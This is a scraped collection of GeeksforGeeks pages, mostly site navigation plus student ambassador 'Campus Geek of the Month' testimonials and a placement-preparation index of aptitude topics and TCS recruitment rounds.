recommend this site to everyone who is planning to go for technical interviews. A word of advice to my fellow mates – being consistent is very important and try implementing your own code before jumping to solutions (just reading the solutions and jumping on to next questions is not enough). Thank you GeeksforGeeks!! My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Campus Geek of the Month - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Campus Geek of the Month Campus Geek of the Month Program The Campus Geeks Connect program is a platform for students who are passionate for coding and very active in programming competitions, clubs and activities around the campus. Being one of the largest placement preparation portal for software job aspirants, Geeksforgeeks is now planning to develop communities around campuses. Campus Geek of the Month is a renowned title rewarded to the best performing Campus Ambassador for a particular month. For more details and application procedure, click here How can I become “Campus Geek of the Month”? Geek of the month is decided by the end of every month on the basis of performance of campus ambassadors in their campus. The considered metrics are active participation, course registrations, workshop organizations and much more. You can also be a star in your campus and feel like a Boss! Apply for Campus Geeks Connect program today. Campus Geek of the month – November 2020 Name: Krish Murarka Testimonial: Hi there, I am Krish Murarka campus Mantri of Kalinga Institute of Industrial Technology (KIIT), Bhubaneshwar, and with great honor, I would like to thank the entire team of GeeksForGeeks for selecting me as the Campus Mantri of the Month. The whole campaign has been awesome wherein I got the perfect platform to learn, share, and connect with different peoples, which eventually boosted my soft skills. I would like to thank Devanshu sir and Ayushmaan sir for constantly guiding me. Campus Geek of the month – October 2020 Name: Aditya Thakur Testimonial: Hey there! I am the Campus Mantri of SRM University, Delhi NCR, Sonepat and it is a great privilege to be chosen as the Campus Mantri of the Month. My journey so far with GeeksforGeeks has been great. I got to network with talented leaders across GfG student chapters, work on my communication and other soft skills while working to build a community of like-minded students within my college. October was also the month GeeksforGeeks Student chapters under the able guidance of Devanshu Sir, Karan Sir, and Daksh Jain organized the Game of Source which was a 10-day long Open-Source event. I got to work as the Sponsorship lead for the event which was a huge learning opportunity in itself. I’d like to thank the GeeksforGeeks family and everyone who has helped me learn and grow Campus Geek of the month – September 2020 Name: AVS Aditya Vardhan Testimonial: Hi, Myself AVS Aditya Vardhan GeeksforGeeks, Campus Mantri for Indian Institute of Information Technology (IIIT) Kottayam would like to thank the GeeksforGeeks Family for this appreciation. GeeksforGeeks gave me a wonderful opportunity to serve the student community and helped me to enhance my leadership skills, networking & programming skills which shaped my career. I feel joyful in sharing and improving the technical knowledge among students on campus through events paving the best path to achieve success. I believe success is not a destination success is a journey. In this amazing journey, I would like to thank Devanshu Sir, Karan Bhargav Sir for good guidance. Campus Geek of the month – August 2020 Name: Nehal Sharma Testimonial: Hey peeps! I am Nehal Sharma, Campus Mantri at Guru Nanak Dev University, Jalandhar campus. I would love to thank the GFG team for choosing me as Campus Mantri of the Month. The journey of being Campus Mantri has been remarkable. Being a part of the GFG family always encouraged my overall growth in terms of both hard skills and soft skills. Also, I feel privileged that I got the opportunity to promote tech culture at my campus by conducting various tech-events in association with GFG. Eventually, I want to express my sincere gratitude to the GFG family and all the mentors who always fostered me and guided me throughout the journey. Campus Geek of the month – July 2020 Name: Chirag Jain Testimonial: Hey! I’m the Campus Mantri of Swami Keshvanand Institute of Technology Management and Gramothan (SKIT), Jaipur, and I would like to take this opportunity to thank the GfG Team and Family for this appreciation. GeeksforGeeks always works as a Catalyst for students to perform well in the Corporate World so it is a pleasure to be in this family. GeeksforGeeks has helped me in endorsing my marketing skills. During this period, the GfG team had always encouraged me to learn and improve my skills including Programming, Communication, Building Connections, and Marketing. I would like to thank specially to Devanshu Sir and Ayushmaan Sir from GfG Team for guidance. Campus Geek of the month – October 2019 Name: Abhishek Raj Permani Testimonial: Being a part of such a Coding Family like Geeks for Geeks is really an awesome experience. Here I meet some awesome people from different parts of India, working in various fields like Web Development, App Development, Machine Learning, and the Internet of Things. During my interacting period from these people, I kept on learning new things and also implementing them on my current projects. I have also enrolled myself in Data structure Course of Geeks For Geeks, it’s an awesome course to learn Data Structure and Algorithm. During this time I have organized many events in collaboration with Geeks For Geeks in my college and support from Geeks For Geeks side is been great. As a Campus Ambassador of Geeks For Geeks, I learned many new skills like marketing and organizing events. I also developed an interest in Competitive Programming after interacting with them. It was the time, after which I started working on my competitive programming skills. I used to code in C++ as a competitive programmer. After understanding the basic data structure and algorithm, I gained confidence and finally got selected for the Summer Internship 2020 at Samsung Research Institute Bangalore (SRIB). I gave my credit for success in all fields to Geeks For Geeks family and will always be thankful to them. At last, I am very thankful to Geeks For Geeks by awarding me “Geek of the Month” title of October month. Campus Geek of the month – September 2019 Name: Shubhangi Gupta Testimonial: I found out about GeeksforGeeks in my first year and that, it covered most of the engineering syllabus. There were last-minute notes for revision! The following year I participated in Sudo Placement and learned some new concepts. I can across the Campus Ambassador program and applied! I wanted to help students learn to code and get better at it. What I liked about GeeksforGeeks was the well-written editorial, it offers a simple solution and then an optimized one, which makes learning easier. Moreover, the platform has an active community of contributors! You can add a comment and get the answer in a few hours, not by the moderators but by the community 🙂 Under the GeeksforGeeks IGDTUW chapter, more than 100 women engineers are learning to code and I am really happy to help them in their journey. Campus Geek of the month – August 2019 Name: Vishruth Khare Testimonial: Hi! I am the Campus Ambassador from Delhi Technological University and I would like to take this opportunity to thank the GeeksforGeeks team for acknowledging me and my efforts. It has been a wonderful association with them. My task as a CA involves maintaining the Facebook page of GfG-DTU, taking up the queries of students, conducting workshops and coding contests and, pitching the courses offered by GeeksForGeeks to students who are unaware about them. GeeksForGeeks community is known for its massive reach among the students and the completeness it offers to preparation and by being a part of this system, I hope to encourage more students into coding so that they cherish the beauty of this platform. GeekForGeeks act as a perfect catalyst for students stepping into the Corporate world, out of their comfort zone. It offers vast knowledge sources under varied domains which makes learning a new skill more structured and accessible. I would like to thank Parikshit Hooda (GfG-DTU CA 2018) for helping me getting accustomed to the GfG interface and the challenges it offers. Also, my sincere gratitude to Ayushman Sir and Mayank Sir from Geeks team for helping me clear my academic as well as moral doubts while I was getting acquainted with the program. All in all, a great experience and I hope to contribute more to the forum for the benefit of its users. Cheers! Happy Coding 🙂 Campus Geek of the month – July 2019 Name: Dev Aryan Shrivastava Testimonial: I am the Campus Ambassador from SRM University, Chennai. I am a technical member of DSC SRM powered by Google Developers. Thanks, GFG for giving this title. Being a campus ambassador my task includes maintaining the facebook, Instagram page. Clarifying the doubts of the students within the campus also leading Geeks for Geeks campus club with efficient team members, organizing seminars, workshops, and collaborating with different clubs on campus, to increase the outreach of geeks for geeks so that people can connect more and more with GFG. Being a Campus Ambassador I got a platform to showcase my leadership skills. I have also enhanced my skills using various sources of geeks for geeks. I would like to thank gfg for always supporting students to build their careers. I will keep contributing to gfg in the future too. Campus Geek of the month – April 2019 Name: Karan Bhargav Testimonial: Hi I am Karan bhargav pursuing bachelor of engineering in computer science from Chandigarh University and I want to thank the GeeksforGeeks community for honoring me with this prestigious title. My tasks include(d) maintaining the Facebook page of GeeksforGeeks-CU, answering the queries that the students of my University have, making more and more people contribute to GeeksforGeeks and representing my University in the GeeksforGeeks Campus Ambassadors community. Also, being a campus ambassador, I was encouraged to learn many new things during this tenure. I used to get certain tasks such as promoting free courses like Sudo Placement, Fork C++, Fork Java, etc. from our assigned mentor and these tasks enhanced our leadership qualities and communication skills. I hope other people benefitted from the courses we promoted. These courses were beneficial for me a lot as I got a lot of experience from these and yeah these were much encouraging one during my projects. So at last, I would like to thanks GFG for providing me such a great opportunity. I will keep contributing to GeeksforGeeks in the future hoping it will help others in increasing their knowledge. Campus Geek of the month – March 2019 Name: Keshav Gupta Testimonial: Hi, I have been practicing questions on GeeksforGeeks from the last 2 years and the website has amazing concepts and all the content needed by a programmer. GeeksforGeeks is a wonderful platform where one can find various programming challenges to practice thoroughly. I also did my summer internship at GFG and it was a fun loving experience for me. Also, being a campus ambassador, I was encouraged to learn many new things during this tenure. I used to get certain tasks such as promoting free courses like Sudo Placement, Fork C++, Fork Java, etc. from our assigned mentor and these tasks enhanced our leadership qualities and communication skills. I hope other people benefitted from the courses we promoted. These courses were beneficial for me a lot as I got a lot of experience from these and yeah these were much encouraging one during my projects. So at last, I would like to thanks GFG for providing me such a great opportunity. Campus Geek of the month – February 2019 Name: Diksha Jain Testimonial: Thanks a lot GeeksforGeeks for awarding me with this prestigious title. I have always been passionate about sharing knowledge and helping others. I encouraged many students to actively participate in coding and learn other things to get a plethora of opportunities. I also motivated myself for the improvement of my programming skills too. It also helped me in improving my leadership skills and personality, along with my programming skills. I will keep contributing to GeeksforGeeks in the future hoping it will help others in increasing their knowledge. Once again, thanks for this amazing title: “Campus Geek of the Month”. Campus Geek of the month – January 2019 Name: Parikshit Lamba Testimonial: I am the Campus Ambassador from Delhi Technological University. My tasks include(d) maintaining the Facebook page of GeeksforGeeks-DTU, answering the queries that the students of my University or otherwise have, making more and more people contribute to GeeksforGeeks(although this happened organically without any directed effort due to active presence that I tried to maintain), representing my University in the GeeksforGeeks Campus Ambassadors community. I got to know about the GeeksforGeeks article contributions, the campus ambassador program and the Geek of the Month accolade from the previous year Campus Ambassador(Nikhil Kumar Singh) from my University. I noticed that there were not that many article on the Blockchain topic. So, I decided to write majorly in that domain. Everything went pretty well. Thanks. Campus Geek of the month – December 2018 Name: Palak Baghla Testimonial: Since May 2018 I have been a part of the Campus Ambassador Program at GeeksforGeeks. And I have always been trying to contribute my best for the organization. I received Goodies from Geeksforgeeks 2 times for performing the tasks properly. Geeksforgeeks knows well how to appraise the CAs for their performance. This has been a huge platform for me to create a good network for myself. An appraisal of “Geek of the month” is really a huge encouragement & it not only boosts our commitment towards the organization but also encourage us to work with more commitment. Even I myself take up courses from Geeksforgeeks and participate in contests held by them. They provide a very helpful platform for the students to learn and boost up their skills. Thank you so much to complete team of GeeksforGeeks! Campus Geek of the month – November 2018 Name: Ipsita Chakraborty Testimonial: I would like to take this opportunity to thank the GeeksforGeeks team for acknowledging me and my efforts. It has been a wonderful experience so long in the Campus Ambassador Program. GeeksforGeeks has always been a saviour throughout, be it last moment studies for exams, learning competetive coding or any new language or some algorithm. Being able to work with GeeksforGeeks is the utmost pleasure for any Computer Science student and I am glad to serve the GeeksforGeeks team as a Campus Ambassador. Being a part of this program, I got to communicate with so many students in my college having keen interest in coding. They were made aware of the different opportunities that GeeksforGeeks is providing like Sudo Placement, Fork Java, Fork CPP, etc. There have also been rewards for the top performers to keep them motivated and for the campus ambassadors as well to keep up the good work. Apart from that we have got assistance from the GeeksforGeeks team in conducting coding contests in the college. All in all, the entire team is doing great work involving students from colleges across the country and reaching out to each and every individual, imparting valuable knowledge. To all the students out there, keep learning, keep growing. Happy Coding ! 😊 My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Placements - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ PlacementsCognizant Recruitment ProcessIBM Recruitment ProcessAccenture Recruitment ProcessNumbersLCM and HCFWork and WagesPipes and CisternsTime Speed DistanceTrains, Boats and StreamsPercentagesRatio Proportion and PartnershipMixture and AlligationAlgebraAgeProfit and LossSimple InterestCompound InterestMensuration 2DMensuration 3DTrigonometry & Height and DistancesProgressions (AP, GP, HP)Permutation and CombinationprobabilityClocks Placements Table of Contents: General Recruitment Process TCS Interview Preparation TCS Recruitment Process TCS Aptitude Questions TCS Email Writing Questions Preparing for HR interviews TCS Interview Experiences Cognizant Recruitment Process IBM Recruitment Process Accenture Recruitment Process Mock Placement Tests Current Courses : Sudo Placement : For companies like Amazon, Microsoft, Adobe, .., etc Sudo Placement 2 : For companies like TCS, Infosys, Wipro, Cognizant, .. etc Register Here for Free General Recruitment Process The placement session for any company generally has 3 – 4 rounds. The first round is the written test, consisting of quantitative aptitude, reasoning (logical ability), English (verbal ability) and computer science subjects (C, C++, Data Structures, Algorithms, DBMS, OS, Networks, etc.). For some companies, you might also have a coding round, which is sometimes taken as a separate round and sometimes is clubbed with the written test. Further rounds are interview rounds, the first two usually being the technical round and successive rounds being the HR round. The Placements Round 1 (Written Test) will cover the following : Quantitative Aptitude Numbers ( Learn | Practice ) LCM and HCF ( Learn | Practice LCM | Practice HCF ) Work and Wages ( Learn | Practice ) Pipes and Cisterns ( Learn | Practice ) Time Speed Distance ( Learn | Practice ) Trains, Boats and Streams ( Learn | Practice ) Percentages ( Learn | Practice ) Ratio Proportion and Partnership ( Learn | Practice ) Mixtures and Alligation ( Learn | Practice ) Algebra ( Learn | Practice ) Average ( Learn | Practice ) Age ( Learn | Practice ) Profit and Loss ( Learn | Practice ) Simple Interest ( Learn | Practice ) Compound Interest ( Learn | Practice) Mensuration 2D ( Learn | Practice) Mensuration 3D ( Learn | Practice) Trigonometry & Height and Distances ( Learn | Practice ) Progressions ( Learn | Practice ) Logarithms ( Learn | Practice ) Permutation and Combination ( Learn | Practice ) Probability ( Learn | Practice ) Geometry ( Learn | Practice ) Clocks ( Learn | Practice ) Calendars ( Learn | Practice) Coding-Decoding ( Learn | Practice ) Race ( Learn | Practice ) Simplification and Approximation ( Learn | Practice ) Data Interpretation ( Learn | Practice ) Reasoning (Logical Ability) Series : Missing Numbers, Odd One Out ( Learn | Practice ) Data Sufficiency ( Learn | Practice ) Assumptions and Conclusions, Courses of Action ( Learn | Practice ) Puzzles ( Learn | Practice ) Syllogism ( Learn | Practice ) Cubes(Placement | Cubes) English (Verbal Ability) Passage/Sentence Rearrangement ( Learn ) Error Detection and Correction ( Learn ) Fill in the Blanks ( Learn ) Comprehension Passages ( Learn ) Computer Science & Programming C Language ( Learn | Practice ) Data Structures ( Learn | MCQ Practice | Coding Practice ( Array, Linked List, Tree, BST, Graph) Algorithms ( Learn | MCQ Practice | Coding Practice ( Searching, Sorting, Maths, DP, Greedy, Bit, Backtracking) C++ Language ( Learn | Practice ) DBMS ( Learn | Practice ) Operating Systems ( Learn | Practice ) Computer Networks ( Learn | Practice ) Java ( Learn | Practice ) For Rounds 2 and 3 : For Placements Round 2 (Coding Test), you need to be familiar with competitive programming. You can practice competitive programming on practice.geeksforgeeks.org. You can also refer company specific coding questions and topic specific coding questions. For Placements Round 3 (Interviews), we are planning to arrange for online mock interviews. But for the time, you can refer interview experiences on GeeksQuiz and interview experiences on GeeksforGeeks. Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, … : These are most common questions (arranged topic-wise) asked in all rounds. Must Do Coding Questions Company-wise : These are most common questions (arranged company-wise) asked in all rounds. TCS Interview Preparation TCS Recruitment Process: TCS conducts 4 rounds to select freshers as Assistant System Engineer in their organization. Written Round Technical Round Managerial Round HR Round –> Learn More TCS Aptitude Questions: Questions in this section are generally used to test the numerical and logical ability of the aspirant. Important topics in this section includes Number system, Equations, Ratio and Proportion, Percentages, Profit and Loss, Time and Work, Time speed Distance, Areas and Mensuration, Averages, Permutations and Combinations, Probability, Plane geometry, Seating Arrangements, Sets, Progressions, Functions, Series, Coding, Truth and Lie based puzzles. Sample Aptitude Questions for TCS interview: TCS Aptitude Questions | Set 1 TCS Aptitude Questions | Set 2 TCS Aptitude Questions | Set 3 TCS Aptitude Questions | Set 4 TCS Aptitude Questions | Set 5 TCS Aptitude Questions | Set 6 TCS Aptitude Questions | Set 7 TCS Aptitude Questions | Set 8 TCS Aptitude Questions | Set 9 TCS Aptitude Questions | Set 10 TCS Email Writing Questions: TCS conducts an E-Mail writing test of 10 minutes duration and is included in the other writing tests. In this test, a situation is introduced at the start of the question followed by a number of phrases ranging from 10 to 15. With a proper understanding of the situation, the applicant needs to frame a formal e-mail, including all those phrases mentioned in the question. Please refer to the article on TCS Placement Paper | E-mail Writing for details about TCS email writing test and guidelines about writing emails. Sample questions on Email Writing: TCS Placement Paper | Email Writing Question 1 TCS Placement Paper | Email Writing Question 2 TCS Placement Paper | Email Writing Question 3 TCS Placement Paper | Email Writing Question 4 TCS Placement Paper | Email Writing Question 5 TCS Placement Paper | Email Writing Question 6 TCS Placement Paper | Email Writing Question 7 TCS Placement Paper | Email Writing Question 8 TCS Placement Paper | Email Writing Question 9 TCS Placement Paper | Email Writing Question 10 TCS Interview Experiences: TCS Interview Experience | Set 1 (On -Campus) TCS Interview Experience | Set 2 (On-campus Recruitment Drive) TCS Interview Experience | Set 3 (On-campus Recruitment Drive) TCS DESS Interview Experience | Set 4 (On-campus) TCS Interview Experience | Set 5 (On-campus) TCS Interview Experience | Set 6 (On-campus) TCS Interview Experience | Set 7 (Off-Campus) TCS Interview Experience | Set 8 (On-Campus) Mock Placement Tests we have prepared a placement preparation course targeting MNCs like TCS, CTS, Wipro, Infosys, Accenture, Capgemini and other leading IT companies. This course contains Placement preparation tracks and Weekly Mock Tests which will help you learn different topics and practice at the same time, simulating the feeling of a real placement test environment. Register Here for Free We hope that our effort helps you in getting your dream job. Good Luck and Keep Preparing. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in Python Most Visited Articles Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceHow To Create a Countdown Timer Using Python?How to find index of a given element in a Vector in C++Find the duration of difference between two dates in Java room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Testimonials - Words that keep us going - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Testimonials – Words that keep us going Drop your Testimonial here Placed in Google Hello, I have been practicing questions on this site for the last 2 years and recently I got placed at Google. Really loved the breadth of concepts and topics available on this site. Great work guys!! Thank you GeeksforGeeks for giving such an awesome platform to prepare for interviews. Suraj Kath Placed in Google Hello, I have been practicing questions on this site for the last 2 years and recently I got placed at Google. Really loved 